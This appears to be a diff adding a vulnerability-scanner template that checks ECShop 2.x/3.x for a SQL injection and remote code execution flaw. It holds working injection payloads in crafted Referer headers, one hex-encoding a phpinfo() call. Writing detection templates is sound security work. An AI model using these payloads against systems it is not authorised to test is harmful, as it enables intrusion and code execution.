@@ -1,0 +1,36 @@
+id: ecshop-2x-sql-inject
+
+info:
+  name: ECShop 2.x/3.x SQL 注入/远程代码执行
+  author: jijue
+  severity: high
+  verified: true
+  description: |
+    ecshop
+  
+rules:
+  r0:
+    request:
+      method: GET
+      path: /user.php?act=login
+      headers:
+        Content-Type: application/x-www-form-urlencoded
+        Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:"num";s:72:"0,1 procedure analyse(extractvalue(rand(),concat(0x7e,version())),1)-- -";s:2:"id";i:1;}
+    expression: (response.body.bcontains(b'XPATH syntax error:') && 
+                 response.body.bcontains(b'[error] =>') && 
+                 response.body.bcontains(b'[0] => Array') && 
+                 response.body.bcontains(b'MySQL server error report:Array')) || 
+                (response.body.bcontains(b'PHP Extension') && response.body.bcontains(b'PHP Version'))
+  r1:
+    request:
+      method: GET
+      path: /user.php?act=login
+      headers:
+        Content-Type: application/x-www-form-urlencoded
+        Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:"num";s:107:"*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275d3b706870696e666f0928293b2f2f7d787878,10-- -";s:2:"id";s:11:"-1' UNION/*";}554fcae493e564ee0dc75bdf2ebf94ca
+    expression: (response.body.bcontains(b'XPATH syntax error:') && 
+                 response.body.bcontains(b'[error] =>') && 
+                 response.body.bcontains(b'[0] => Array') && 
+                 response.body.bcontains(b'MySQL server error report:Array')) || 
+                (response.body.bcontains(b'PHP Extension') && response.body.bcontains(b'PHP Version'))
+expression: r0() || r1()
